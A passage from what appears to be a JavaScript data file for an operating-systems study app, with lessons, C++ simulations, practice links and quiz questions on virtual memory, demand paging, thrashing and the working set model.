            ['Paging vs Segmentation - GFG', 'https://www.geeksforgeeks.org/difference-between-paging-and-segmentation/', 'Easy'],
            ['Memory Management MCQs - GFG', 'https://www.geeksforgeeks.org/operating-systems-gq/memory-management-gq/', 'Medium'],
            ['Segmented Paging', 'https://www.geeksforgeeks.org/paged-segmentation-and-segmented-paging/', 'Hard'],
          ],
          mcqs: [
            {q: 'What type of fragmentation does segmentation suffer from?', o: ['Internal fragmentation', 'External fragmentation', 'Both', 'Neither'], a: 1},
            {q: 'A logical address in segmentation consists of:', o: ['Page number + offset', 'Segment number + offset', 'Frame number + offset', 'Base address + limit'], a: 1},
            {q: 'What causes a segmentation fault?', o: ['Page not in memory', 'Offset exceeds segment limit', 'TLB miss', 'Cache miss'], a: 1},
            {q: 'What is the advantage of mmap() over read()/write() for large files?', o: ['It is always faster', 'Zero-copy access; the kernel pages data in/out via demand paging', 'It bypasses the filesystem', 'It works without a file descriptor'], a: 1},
            {q: 'In segmented paging, a logical address consists of:', o: ['(page, offset)', '(segment, offset)', '(segment, page, offset)', '(base, limit)'], a: 2},
            {q: 'In x86-64, which segment registers are still actively used?', o: ['CS and DS', 'SS and ES', 'FS and GS (for thread-local storage)', 'All segment registers'], a: 2},
          ]
        },
      ],
    },

    // ===== TAB: VIRTUAL MEMORY =====
    {
      id: 'vm', t: 'Virtual Memory',
      topics: [
        // ----- Topic 0: Virtual Memory & Demand Paging -----
        {
          t: 'Virtual Memory & Demand Paging',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Modern applications routinely allocate more virtual memory than physical RAM. Virtual memory makes this work through demand paging &mdash; loading pages only when accessed. However, excessive page faults degrade performance by 10,000x (disk access vs memory), making it critical to understand demand paging.</p></div><div class="learn-section"><div class="learn-h">What is Virtual Memory?</div><p class="learn-p"><b>Virtual memory</b> is a memory management technique that gives each process the illusion of having a large, contiguous address space, even if physical memory (RAM) is much smaller. It achieves this by using disk space (swap space) as an extension of RAM.</p><p class="learn-p"><b>Key benefits:</b></p><ul class="learn-list"><li><b>Larger address space:</b> Processes can use more memory than physically available.</li><li><b>Isolation:</b> Each process has its own virtual address space, protected from other processes.</li><li><b>Efficient memory use:</b> Only the actively used pages need to be in RAM; the rest stay on disk.</li><li><b>Simplified linking and loading:</b> Programs can be loaded at any physical address.</li><li><b>Shared libraries:</b> Multiple processes can share the same physical copy of a shared library, each mapping it into their own virtual space.</li></ul></div><div class="learn-section"><div class="learn-h">Demand Paging</div><p class="learn-p"><b>Demand paging</b> is the most common implementation of virtual memory. Pages are loaded into memory <b>only when they are accessed</b> (on demand), not in advance.</p><p class="learn-p"><b>Lazy swapper (pager):</b> Never brings a page into memory unless it is needed. Initially, the page table marks all pages as <b>invalid</b>. When a page is accessed:</p><ol class="learn-list"><li>The CPU generates a logical address.</li><li>The MMU checks the page table. If the valid bit is 0 &rarr; <b>page fault</b>.</li><li>The OS traps, finds the page on disk, loads it into a free frame, updates the page table (valid = 1, frame number set), and restarts the instruction.</li></ol><div class="learn-code">// Page fault handling pseudocode:\n1. Trap to OS\n2. Save user registers and process state\n3. Determine that the interrupt was a page fault\n4. Check that the page reference was legal\n5. Find a free frame (or use page replacement)\n6. Schedule disk I/O to read the page into the frame\n7. When I/O completes, update the page table\n8. Restart the instruction that caused the page fault</div></div><div class="learn-section"><div class="learn-h">Performance of Demand Paging</div><p class="learn-p">The effective access time with demand paging depends on the <b>page fault rate (p)</b>:</p><div class="learn-code">EAT = (1 - p) * memory_access_time + p * page_fault_service_time\n\n// Typical values:\n// memory_access_time = 200 ns\n// page_fault_service_time = 8 ms = 8,000,000 ns\n//\n// If p = 1/1000 (0.001):\n// EAT = 0.999 * 200 + 0.001 * 8,000,000\n//     = 199.8 + 8,000 = 8,199.8 ns (40x slowdown!)\n//\n// To keep slowdown under 10%:\n// 220 > (1-p)*200 + p*8,000,000\n// 20 > p * 7,999,800\n// p < 0.0000025 (less than 1 fault per 400,000 accesses)</div><div class="learn-warn"><b>Warning:</b> Page faults are <b>extremely expensive</b> due to disk I/O. Even a very small page fault rate can significantly degrade performance. This is why good page replacement algorithms and sufficient RAM are critical.</div></div><div class="learn-section"><div class="learn-h">Swap Space</div><p class="learn-p"><b>Swap space</b> is the disk area used as an extension of physical memory. When RAM is full, the OS moves (swaps out) less-used pages to swap and brings them back (swaps in) on demand.</p><ul class="learn-list"><li><b>Swap partition vs swap file:</b> A dedicated partition gives contiguous disk access (faster). A swap file is more flexible (can resize). Linux supports both.</li><li><b>Sizing:</b> Traditional rule: swap = 2&times; RAM. Modern: depends on workload. Servers with large RAM may use little swap; hibernation requires swap &ge; RAM size.</li><li><b>Swappiness (Linux):</b> <code>vm.swappiness</code> (0-100) controls how aggressively the kernel swaps. 0 = avoid swapping (prefer dropping page cache), 100 = swap eagerly. Default is 60.</li></ul><div class="learn-tip"><b>Tip:</b> COW and mmap are covered in the Memory Management tab. Here we focus on how virtual memory uses demand paging and swap to extend physical memory.</div></div><div class="learn-section"><div class="learn-h">Linux Virtual Memory Internals</div><p class="learn-p">Key data structures in Linux VM:</p><ul class="learn-list"><li><b>vm_area_struct (VMA):</b> Describes a contiguous region in a process\'s virtual address space (start, end, permissions, backing file). Stored in a red-black tree per process.</li><li><b>Page cache:</b> Kernel-managed cache of file-backed pages. Both read() and mmap() go through the page cache. Dirty pages are written back by the <code>pdflush</code>/<code>kworker</code> daemon.</li><li><b>kswapd:</b> Background kernel thread that reclaims pages when free memory drops below watermarks. Uses a two-list strategy: active list (recently accessed) and inactive list (candidates for eviction).</li><li><b>OOM Killer:</b> When all reclamation fails, the Out-Of-Memory killer selects and terminates a process. Selection based on <code>oom_score</code> (memory usage, nice value, etc.).</li></ul><div class="learn-code">// Check swap and memory on Linux:\n$ free -h\n$ cat /proc/meminfo\n$ swapon --show\n$ cat /proc/sys/vm/swappiness\n\n// Per-process virtual memory:\n$ cat /proc/PID/maps      // VMA regions\n$ cat /proc/PID/smaps      // Detailed memory per VMA\n$ cat /proc/PID/status     // VmRSS, VmSize, etc.</div></div><div class="learn-section"><div class="learn-h">Pre-paging</div><p class="learn-p"><b>Pre-paging</b> loads several pages at once when a page fault occurs, anticipating that nearby pages will be needed soon (exploiting <b>spatial locality</b>). This can reduce the total number of page faults but may waste I/O bandwidth if the loaded pages are not actually used.</p><div class="learn-tip"><b>Tip:</b> Demand paging with good locality of reference is highly efficient. Most programs exhibit strong temporal and spatial locality, making demand paging practical.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Technique</th><th>When Pages Load</th><th>Advantage</th><th>Disadvantage</th></tr><tr><td>Demand Paging</td><td>On first access (page fault)</td><td>Minimum memory used</td><td>Initial faults for every page</td></tr><tr><td>Pre-paging</td><td>Load nearby pages on fault</td><td>Fewer faults if spatial locality</td><td>Wastes I/O if pages not needed</td></tr><tr><td>Swap prefetching</td><td>Predict and pre-load from swap</td><td>Reduces fault latency</td><td>Wasted bandwidth if wrong</td></tr><tr><td>kswapd (Linux)</td><td>Background reclamation below watermarks</td><td>Proactive, avoids sudden stalls</td><td>May evict useful pages under pressure</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Page fault cost is enormous:</b> Memory ~100 ns vs page fault ~8 ms (HDD) = 80,000x slower. Even SSDs (~100 &mu;s) are 1000x slower.</li><li><b>EAT formula assumes uniform access:</b> Real programs have locality, so fault rate is NOT uniform.</li><li><b>Swap space exhaustion:</b> When both RAM and swap are full, the OOM killer terminates processes. In production, monitor swap usage and set <code>vm.overcommit_memory</code> appropriately.</li><li><b>Demand zeroing:</b> Newly allocated pages must be zeroed for security (prevent reading previous process data). Cheaper than disk fault but still ~1 &mu;s.</li><li><b>Overcommit:</b> Linux by default allows processes to allocate more virtual memory than physically available (RAM + swap). This is efficient when processes don\'t actually use all allocated memory, but can lead to OOM kills under pressure.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>Latency</th><th>Compared to Memory</th></tr><tr><td>Memory access (no fault)</td><td>~100 ns</td><td>1x (baseline)</td></tr><tr><td>TLB miss (page table walk)</td><td>~400 ns</td><td>4x</td></tr><tr><td>Minor page fault (zero-fill or COW)</td><td>~1-10 &mu;s</td><td>10-100x</td></tr><tr><td>Major page fault (disk, HDD)</td><td>~8 ms</td><td>80,000x</td></tr><tr><td>Major page fault (disk, SSD)</td><td>~100 &mu;s</td><td>1,000x</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Major vs minor page fault?</b><br>A: Major requires reading from disk (~8 ms). Minor is resolved without disk I/O: page is in page cache, or it is a zero-fill or COW copy (~1-10 &mu;s).</p><p class="learn-p"><b>Q2: How does COW make fork() efficient?</b><br>A: After fork(), parent and child share all physical pages, marked read-only. Only when either writes does the OS copy that single page. If child immediately calls exec(), most pages are never copied.</p><p class="learn-p"><b>Q3: Calculate EAT with p=0.001, memory=200ns, fault=10ms.</b><br>A: EAT = (1-p)*200 + p*10,000,000 = 199.8 + 10,000 = 10,199.8 ns. A 51x slowdown from just 0.1% fault rate!</p><p class="learn-p"><b>Q4: What is memory-mapped I/O?</b><br>A: mmap() maps a file into virtual address space. Contents are demand-paged: on access, a page fault loads the file page. Subsequent accesses hit the page cache. Enables zero-copy sharing.</p><p class="learn-p"><b>Q5: Why must the OS zero pages before giving to new processes?</b><br>A: Security: without zeroing, a process could read data left by a terminated process. The OS uses demand zeroing: pages zeroed on first access, spreading cost over time.</p><p class="learn-p"><b>Q6: How does Linux reclaim memory under pressure?</b><br>A: kswapd runs in the background when free memory drops below watermarks. It scans the inactive list for pages to evict. File-backed clean pages are dropped; dirty pages are written back first. Anonymous pages go to swap. If reclamation fails, the OOM killer terminates a process.</p><p class="learn-p"><b>Q7: What is memory overcommit and why does Linux allow it?</b><br>A: Overcommit lets processes allocate more virtual memory than physical RAM + swap. This works because most allocated memory is never fully used (e.g., malloc 1GB but only touch 100MB). The risk: if too many processes actually use their allocation, the OOM killer intervenes.</p></div>',
          code: `// Virtual Memory / Demand Paging Simulation in C++
#include <iostream>
#include <vector>
#include <unordered_map>
#include <unordered_set>
#include <list>
#include <cstdlib>
using namespace std;

class VirtualMemorySimulator {
    int numFrames;       // Physical frames available
    int pageSize;        // Bytes per page
    int totalVirtualPages;

    struct Frame {
        int pageNum;
        bool dirty;
        bool valid;
    };

    vector<Frame> physicalMemory;
    list<int> lruOrder;  // For LRU replacement
    unordered_map<int, list<int>::iterator> pageToIter;
    unordered_map<int, int> pageToFrame; // page -> frame mapping

    int pageFaults;
    int pageHits;
    int diskWrites;      // Dirty page writebacks

public:
    VirtualMemorySimulator(int frames, int pgSize, int virtualPages)
        : numFrames(frames), pageSize(pgSize),
          totalVirtualPages(virtualPages),
          pageFaults(0), pageHits(0), diskWrites(0)
    {
        physicalMemory.resize(frames, {-1, false, false});
    }

    // Find a free frame, or evict using LRU
    int getFrame(int newPage) {
        // Check for free frame
        for (int i = 0; i < numFrames; i++) {
            if (!physicalMemory[i].valid) return i;
        }

        // LRU eviction
        int victimPage = lruOrder.back();
        lruOrder.pop_back();
        pageToIter.erase(victimPage);

        int frame = pageToFrame[victimPage];
        if (physicalMemory[frame].dirty) {
            cout << "    Writeback: page " << victimPage
                 << " (dirty) to disk" << endl;
            diskWrites++;
        }
        cout << "    Evict: page " << victimPage << " from frame "
             << frame << endl;
        pageToFrame.erase(victimPage);
        return frame;
    }

    // Access a virtual address
    void accessAddress(int virtualAddr, bool isWrite) {
        int pageNum = virtualAddr / pageSize;
        int offset = virtualAddr % pageSize;

        cout << (isWrite ? "Write" : "Read") << " addr " << virtualAddr
             << " (page=" << pageNum << ", offset=" << offset << "): ";

        if (pageToFrame.find(pageNum) != pageToFrame.end()) {
            // Page hit
            pageHits++;
            cout << "HIT (frame " << pageToFrame[pageNum] << ")" << endl;

            // Update LRU order
            lruOrder.erase(pageToIter[pageNum]);
            lruOrder.push_front(pageNum);
            pageToIter[pageNum] = lruOrder.begin();

            if (isWrite) {
                physicalMemory[pageToFrame[pageNum]].dirty = true;
            }
        } else {
            // Page fault!
            pageFaults++;
            cout << "PAGE FAULT!" << endl;

            int frame = getFrame(pageNum);
            cout << "    Load: page " << pageNum << " into frame "
                 << frame << endl;

            physicalMemory[frame] = {pageNum, isWrite, true};
            pageToFrame[pageNum] = frame;
            lruOrder.push_front(pageNum);
            pageToIter[pageNum] = lruOrder.begin();
        }
    }

    void printStats() {
        int total = pageHits + pageFaults;
        cout << "\\n=== Statistics ===" << endl;
        cout << "Total accesses: " << total << endl;
        cout << "Page hits:   " << pageHits << " ("
             << (total > 0 ? pageHits * 100.0 / total : 0) << "%)" << endl;
        cout << "Page faults: " << pageFaults << " ("
             << (total > 0 ? pageFaults * 100.0 / total : 0) << "%)" << endl;
        cout << "Disk writes: " << diskWrites << endl;

        // EAT calculation
        double memTime = 100;   // ns
        double faultTime = 8e6; // ns (8ms for disk I/O)
        double p = (total > 0) ? (double)pageFaults / total : 0;
        double eat = (1 - p) * memTime + p * faultTime;
        cout << "Effective Access Time: " << eat << " ns" << endl;
    }
};

int main() {
    cout << "=== Virtual Memory Demand Paging Simulator ===" << endl;
    // 4 physical frames, 1024-byte pages, 16 virtual pages
    VirtualMemorySimulator vm(4, 1024, 16);

    // Simulate a reference pattern with locality
    vm.accessAddress(0, false);      // Page 0 read
    vm.accessAddress(1024, false);   // Page 1 read
    vm.accessAddress(2048, true);    // Page 2 write
    vm.accessAddress(3072, false);   // Page 3 read
    vm.accessAddress(100, false);    // Page 0 hit
    vm.accessAddress(4096, false);   // Page 4 fault (evict LRU)
    vm.accessAddress(1100, false);   // Page 1 hit
    vm.accessAddress(2100, false);   // Page 2 hit (dirty)
    vm.accessAddress(5120, true);    // Page 5 fault
    vm.accessAddress(3200, false);   // Page 3 fault (was evicted)
    vm.accessAddress(50, false);     // Page 0 fault
    vm.accessAddress(1200, false);   // Page 1 hit

    vm.printStats();
    return 0;
}`,
          problems: [
            ['Virtual Memory in OS', 'https://www.geeksforgeeks.org/virtual-memory-in-operating-system/', 'Easy'],
            ['Page Fault Handling', 'https://www.geeksforgeeks.org/page-fault-handling-in-operating-system/', 'Medium'],
            ['Swap Space Management', 'https://www.geeksforgeeks.org/swap-space-management-in-operating-system/', 'Easy'],
          ],
          mcqs: [
            {q: 'What is the main advantage of demand paging over loading all pages at startup?', o: ['Faster disk access', 'Lower memory usage since only needed pages are loaded', 'Simpler implementation', 'No page faults occur'], a: 1},
            {q: 'In Copy-on-Write, when is a physical copy of a shared page actually created?', o: ['Immediately after fork()', 'When either process writes to the page', 'When the child process starts executing', 'When the parent process terminates'], a: 1},
            {q: 'If the page fault rate is 0.001 and page fault service time is 10ms, what is the approximate EAT (memory access = 200ns)?', o: ['200 ns', '10,200 ns', '1,020 ns', '100,200 ns'], a: 1},
            {q: 'What does vm.swappiness=0 mean in Linux?', o: ['Disable swap entirely', 'Prefer dropping page cache over swapping process pages', 'Swap as aggressively as possible', 'Use swap only for anonymous pages'], a: 1},
            {q: 'What is a minor page fault?', o: ['A fault that crashes the process', 'A fault resolved without disk I/O (e.g., zero-fill or COW)', 'A fault on a read-only page', 'A fault in kernel space'], a: 1},
            {q: 'What does the Linux OOM killer do when memory is exhausted?', o: ['Kills the oldest process', 'Selects and terminates a process based on oom_score', 'Reboots the system', 'Doubles swap space'], a: 1},
          ],
        },
        // ----- Topic 1: Thrashing & Working Set Model -----
        {
          t: 'Thrashing & Working Set Model',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">A production database server suddenly slows to a crawl: CPU utilization drops to 5% while disk I/O is at 100%. The admin, seeing low CPU usage, starts MORE instances, making things worse. This is thrashing: the system spends all its time swapping pages, doing no useful work. Understanding thrashing is critical for capacity planning.</p></div><div class="learn-section"><div class="learn-h">What is Thrashing?</div><p class="learn-p"><b>Thrashing</b> occurs when a system spends more time <b>swapping pages in and out</b> of memory than executing useful work. It is a catastrophic performance degradation caused by insufficient physical memory for the working sets of active processes.</p><p class="learn-p"><b>How thrashing develops:</b></p><ol class="learn-list"><li>The OS tries to increase the <b>degree of multiprogramming</b> (number of processes in memory) to improve CPU utilization.</li><li>More processes = less frames per process.</li><li>Processes start experiencing more <b>page faults</b>.</li><li>Processes spend more time waiting for I/O (page swaps), so CPU utilization <b>drops</b>.</li><li>The OS responds by loading <b>even more processes</b>, making it worse.</li><li>System enters a <b>death spiral</b>: CPU utilization collapses, I/O devices are saturated with page swaps.</li></ol><div class="learn-warn"><b>Warning:</b> Thrashing is one of the most common causes of system performance degradation. It can bring even powerful servers to their knees if not properly managed.</div></div><div class="learn-section"><div class="learn-h">Causes of Thrashing</div><p class="learn-p">The fundamental cause is that the sum of all processes\' <b>working sets</b> exceeds the available physical memory:</p><ul class="learn-list"><li>&Sigma; Working Set Size(i) &gt; Total Physical Frames</li></ul><p class="learn-p">Contributing factors:</p><ul class="learn-list"><li>Too many processes competing for limited memory.</li><li>Insufficient RAM for the workload.</li><li>Poor page replacement algorithm (e.g., replacing pages that will be needed soon).</li><li>Poor locality of reference in programs (e.g., random access patterns over large data).</li></ul></div><div class="learn-section"><div class="learn-h">Locality of Reference</div><p class="learn-p">Most programs exhibit <b>locality of reference</b>, which is what makes virtual memory practical:</p><table class="learn-table"><tr><th>Type</th><th>Description</th><th>Example</th></tr><tr><td>Temporal Locality</td><td>Recently accessed data is likely to be accessed again soon</td><td>Loop variables, frequently called functions</td></tr><tr><td>Spatial Locality</td><td>Data near recently accessed data is likely to be accessed soon</td><td>Array traversals, sequential code execution</td></tr></table><p class="learn-p">A process transitions between <b>locality sets</b>. Each locality is a set of pages that are actively used together (e.g., pages of a function and its data). When a process moves to a new locality, page faults spike temporarily but settle down once the new pages are loaded.</p></div><div class="learn-section"><div class="learn-h">Working Set Model</div><p class="learn-p">The <b>Working Set</b> of a process is the set of pages it has referenced during the last <b>&Delta;</b> (delta) time units (the <b>working set window</b>).</p><div class="learn-code">// Working Set at time t with window delta:\n// WS(t, &Delta;) = { pages referenced in the interval (t - &Delta;, t) }\n//\n// Example: Reference string = ...2, 6, 1, 5, 7, 7, 7, 7, 5, 1...\n// At the end, with &Delta; = 10:\n// WS = {1, 2, 5, 6, 7} (5 distinct pages)\n// Working Set Size (WSS) = 5</div><p class="learn-p"><b>Key insight:</b> If each process is allocated at least as many frames as its working set size (WSS<sub>i</sub>), thrashing is prevented.</p><p class="learn-p">Total demand: <b>D = &Sigma; WSS<sub>i</sub></b>. If D &gt; total frames, thrashing will occur. In this case, <b>suspend one or more processes</b> to free memory.</p><div class="learn-tip"><b>Tip:</b> Choosing &Delta; is critical. Too small &rarr; doesn\'t capture the full locality. Too large &rarr; includes pages from old localities. Typical approach: use the page fault frequency to adaptively adjust.</div></div><div class="learn-section"><div class="learn-h">Page Fault Frequency (PFF) Strategy</div><p class="learn-p">An alternative to the working set model: directly control the <b>page fault frequency</b> of each process.</p><ul class="learn-list"><li>If a process\'s page fault rate is <b>too high</b> (above upper threshold): allocate more frames to it.</li><li>If a process\'s page fault rate is <b>too low</b> (below lower threshold): take frames away (it has more than it needs).</li><li>If total demand exceeds supply: <b>suspend a process</b>.</li></ul><p class="learn-p">PFF provides a more <b>direct</b> way to manage memory allocation than the working set model.</p></div><div class="learn-section"><div class="learn-h">Preventing Thrashing</div><p class="learn-p">Strategies to prevent or mitigate thrashing:</p><ol class="learn-list"><li><b>Working Set / PFF:</b> Allocate sufficient frames based on actual usage patterns.</li><li><b>Load control:</b> Limit the degree of multiprogramming. Use a medium-term scheduler to swap out processes when memory is low.</li><li><b>Add physical memory:</b> The most straightforward hardware solution.</li><li><b>Better locality programs:</b> Programmers should write code with good locality (e.g., access arrays row-by-row in row-major languages like C).</li><li><b>Proportional allocation:</b> Allocate frames proportional to process size or priority.</li></ol></div><div class="learn-section"><div class="learn-h">Frame Allocation Strategies</div><table class="learn-table"><tr><th>Strategy</th><th>Description</th></tr><tr><td>Equal Allocation</td><td>Divide frames equally among all processes. Simple but ignores different needs.</td></tr><tr><td>Proportional Allocation</td><td>Allocate frames proportional to process size: a<sub>i</sub> = (s<sub>i</sub> / &Sigma;s) * m frames.</td></tr><tr><td>Priority Allocation</td><td>Allocate based on priority rather than size.</td></tr><tr><td>Global Replacement</td><td>A process can replace any frame (even from another process). More throughput but less predictable.</td></tr><tr><td>Local Replacement</td><td>A process can only replace its own frames. More predictable but may underutilize memory.</td></tr></table><div class="learn-warn"><b>Warning:</b> <b>Global replacement</b> can cause thrashing more easily because one process can steal frames from another, causing the victim to page fault more. However, it generally achieves better throughput and is used by most real systems.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Strategy</th><th>Approach</th><th>Granularity</th><th>Reaction Speed</th></tr><tr><td>Working Set Model</td><td>Track pages used in last delta references</td><td>Per process</td><td>Slow (window-based)</td></tr><tr><td>Page Fault Frequency (PFF)</td><td>Monitor fault rate; adjust allocation</td><td>Per process</td><td>Fast (direct measurement)</td></tr><tr><td>Load Control</td><td>Limit degree of multiprogramming</td><td>System-wide</td><td>Medium</td></tr><tr><td>Global vs Local Replacement</td><td>Global: any frame; Local: own frames only</td><td>System/Process</td><td>N/A</td></tr></table><p class="learn-p"><b>Frame Allocation Policies:</b></p><table class="learn-table"><tr><th>Policy</th><th>Formula</th><th>Pros</th><th>Cons</th></tr><tr><td>Equal</td><td>m / n frames each</td><td>Simple, fair</td><td>Ignores different needs</td></tr><tr><td>Proportional</td><td>s_i / sum(s) * m</td><td>Accounts for process size</td><td>Large idle processes waste frames</td></tr><tr><td>Priority-based</td><td>Based on process priority</td><td>Important processes get more</td><td>Low-priority may thrash</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>The thrashing death spiral:</b> Low CPU util &rarr; OS adds processes &rarr; more faults &rarr; even lower CPU &rarr; more processes. The correct response is REDUCE processes.</li><li><b>Global replacement enables thrashing:</b> One process can steal frames from another, causing cascading faults. Local replacement isolates processes.</li><li><b>Working set delta is hard to choose:</b> Too small underestimates needs. Too large overestimates. No single delta works for all phases.</li><li><b>SSD vs HDD thrashing:</b> SSDs are ~100x faster random access, so thrashing is less catastrophic but still 1000x slower than RAM.</li><li><b>Locality transitions cause spikes:</b> When a process enters a new locality, fault rate spikes temporarily. PFF must avoid over-reacting.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Technique</th><th>Overhead</th><th>Effectiveness</th><th>Implementation</th></tr><tr><td>Working Set tracking</td><td><span class="learn-complexity">O(delta) per process per reference</span></td><td>High (if delta well-chosen)</td><td>Complex (approximate with timer interrupts)</td></tr><tr><td>PFF monitoring</td><td><span class="learn-complexity">O(1) per fault</span></td><td>High (direct measurement)</td><td>Simple (compare rate to thresholds)</td></tr><tr><td>Load control</td><td><span class="learn-complexity">O(1) per scheduling decision</span></td><td>Moderate (coarse-grained)</td><td>Simple (limit admission)</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is thrashing and what causes it?</b><br>A: Thrashing is when a system spends more time paging than executing. Root cause: the sum of all processes\' working sets exceeds available physical memory.</p><p class="learn-p"><b>Q2: How does the Working Set model prevent thrashing?</b><br>A: It tracks which pages each process accessed in the last delta time units. If total demand exceeds frames, the OS suspends a process to free memory.</p><p class="learn-p"><b>Q3: What is the Page Fault Frequency strategy?</b><br>A: PFF monitors each process\'s fault rate directly. If rate exceeds upper threshold, allocate more frames. If below lower threshold, reclaim frames. If no free frames, suspend a process.</p><p class="learn-p"><b>Q4: Global vs local page replacement and thrashing?</b><br>A: Global: one process\'s faults can cause another to lose pages, creating cascading effects. Local: each process can only evict its own pages, isolating processes but potentially wasting memory.</p><p class="learn-p"><b>Q5: How to diagnose thrashing on a production server?</b><br>A: Look for: high swap I/O (vmstat si/so), low CPU utilization despite load, high page fault rate (sar -B), high I/O wait. Resolution: add RAM, reduce processes, optimize memory usage, or use SSDs.</p><p class="learn-p"><b>Q6: Why does global replacement generally outperform local replacement?</b><br>A: Global replacement lets the system give free frames to whichever process needs them most, improving overall throughput. Local replacement can leave frames idle in processes that don\'t need them while others thrash. However, global replacement is less predictable per-process.</p><p class="learn-p"><b>Q7: How does row-major vs column-major array access affect page faults?</b><br>A: In C (row-major), accessing a[i][j] by varying j (inner loop over columns) follows spatial locality — consecutive elements are in the same page. Accessing by varying i (inner loop over rows) jumps across pages, causing many more page faults for large arrays.</p></div>',
          code: `// Working Set and Thrashing Simulation in C++
#include <iostream>
#include <vector>
#include <unordered_set>
#include <deque>
#include <cmath>
using namespace std;

// Calculate Working Set Size at each point in the reference string
void workingSetDemo(vector<int>& refs, int delta) {
    cout << "=== Working Set Analysis (delta=" << delta << ") ===" << endl;
    cout << "Time\\tPage\\tWorking Set\\t\\tWSS" << endl;

    for (int t = 0; t < (int)refs.size(); t++) {
        unordered_set<int> ws;
        int start = max(0, t - delta + 1);
        for (int i = start; i <= t; i++) {
            ws.insert(refs[i]);
        }
        cout << t << "\\t" << refs[t] << "\\t{";
        bool first = true;
        for (int p : ws) {
            if (!first) cout << ",";
            cout << p;
            first = false;
        }
        cout << "}\\t\\t\\t" << ws.size() << endl;
    }
}

// Simulate thrashing: show page fault rate vs degree of multiprogramming
void thrashingSimulation() {
    cout << "\\n=== Thrashing Simulation ===" << endl;
    cout << "Processes\\tFrames/Proc\\tFault Rate\\tCPU Util" << endl;

    int totalFrames = 100;

    for (int numProcs = 1; numProcs <= 20; numProcs++) {
        int framesPerProc = totalFrames / numProcs;
        int wssNeeded = 10; // Each process needs ~10 frames

        // Model: if frames < WSS, fault rate increases dramatically
        double faultRate;
        if (framesPerProc >= wssNeeded) {
            faultRate = 0.001 * wssNeeded / framesPerProc;
        } else {
            // Severe fault rate when frames < working set size
            faultRate = 0.5 * (1.0 - (double)framesPerProc / wssNeeded);
        }
        faultRate = min(faultRate, 0.9);

        // CPU utilization model
        // When processes are doing I/O (page faults), CPU is idle
        double cpuUtil = numProcs * (1.0 - faultRate);
        cpuUtil = min(cpuUtil, 1.0); // Cap at 100%

        // But if thrashing, CPU util drops dramatically
        if (faultRate > 0.1) {
            cpuUtil = cpuUtil * (1.0 - faultRate);
        }

        cout << numProcs << "\\t\\t" << framesPerProc << "\\t\\t"
             << (int)(faultRate * 100) << "%\\t\\t"
             << (int)(cpuUtil * 100) << "%" << endl;
    }
}

// Page Fault Frequency (PFF) based allocation
class PFFAllocator {
    double upperThreshold;
    double lowerThreshold;
    int totalFrames;
    int numProcesses;
    vector<int> allocatedFrames;
    vector<double> faultRates;

public:
    PFFAllocator(int frames, int procs, double upper, double lower)
        : totalFrames(frames), numProcesses(procs),
          upperThreshold(upper), lowerThreshold(lower)
    {
        // Start with equal allocation
        allocatedFrames.resize(procs, frames / procs);
        faultRates.resize(procs, 0.05); // Initial fault rates
    }

    void adjust() {
        cout << "\\n=== PFF Frame Allocation ===" << endl;
        cout << "Proc\\tFrames\\tFault Rate\\tAction" << endl;

        for (int i = 0; i < numProcesses; i++) {
            string action = "OK";
            if (faultRates[i] > upperThreshold) {
                // Need more frames
                int extra = min(5, totalFrames - usedFrames());
                if (extra > 0) {
                    allocatedFrames[i] += extra;
                    action = "Add " + to_string(extra) + " frames";
                } else {
                    action = "SUSPEND (no free frames)";
                }
            } else if (faultRates[i] < lowerThreshold) {
                // Has too many frames
                int release = max(1, allocatedFrames[i] / 4);
                allocatedFrames[i] -= release;
                action = "Release " + to_string(release) + " frames";
            }

            cout << "P" << i << "\\t" << allocatedFrames[i] << "\\t"
                 << (int)(faultRates[i] * 100) << "%\\t\\t"
                 << action << endl;
        }
    }

    int usedFrames() {
        int sum = 0;
        for (int f : allocatedFrames) sum += f;
        return sum;
    }

    void setFaultRate(int proc, double rate) {
        faultRates[proc] = rate;
    }
};

int main() {
    // Working Set demo
    vector<int> refs = {1, 2, 3, 2, 1, 4, 5, 4, 3, 2, 1, 5};
    workingSetDemo(refs, 4);

    // Thrashing simulation
    thrashingSimulation();

    // PFF demo
    PFFAllocator pff(100, 5, 0.15, 0.02);
    pff.setFaultRate(0, 0.20);  // Too high
    pff.setFaultRate(1, 0.01);  // Too low
    pff.setFaultRate(2, 0.08);  // OK
    pff.setFaultRate(3, 0.25);  // Too high
    pff.setFaultRate(4, 0.05);  // OK
    pff.adjust();

    return 0;
}`,
          problems: [
            ['Thrashing in Operating System', 'https://www.geeksforgeeks.org/techniques-to-handle-thrashing/', 'Medium'],
            ['Page Fault Rate and EAT', 'https://www.geeksforgeeks.org/page-table-entries-in-page-table/', 'Easy'],
            ['Frame Allocation Algorithms', 'https://www.geeksforgeeks.org/operating-system-allocation-frames/', 'Medium'],
            ['Locality of Reference', 'https://www.geeksforgeeks.org/locality-of-reference-and-cache-operation-in-cache-memory/', 'Easy'],
          ],
          mcqs: [
            {q: 'Thrashing occurs when:', o: ['CPU utilization is very high', 'The system spends more time paging than executing', 'All processes are in the ready state', 'The disk is full'], a: 1},
            {q: 'In the Working Set model, what happens when the total working set demand exceeds available frames?', o: ['The OS allocates more disk space', 'A process is suspended to free memory', 'All processes share frames equally', 'The page size is increased'], a: 1},
            {q: 'Which of the following best prevents thrashing?', o: ['Using FIFO page replacement', 'Increasing page size', 'Controlling the degree of multiprogramming', 'Using larger disks'], a: 2},
            {q: 'In the PFF strategy, what happens when a process\'s page fault rate exceeds the upper threshold?', o: ['The process is killed', 'It is given more frames', 'Its pages are all evicted', 'The page size is reduced'], a: 1},
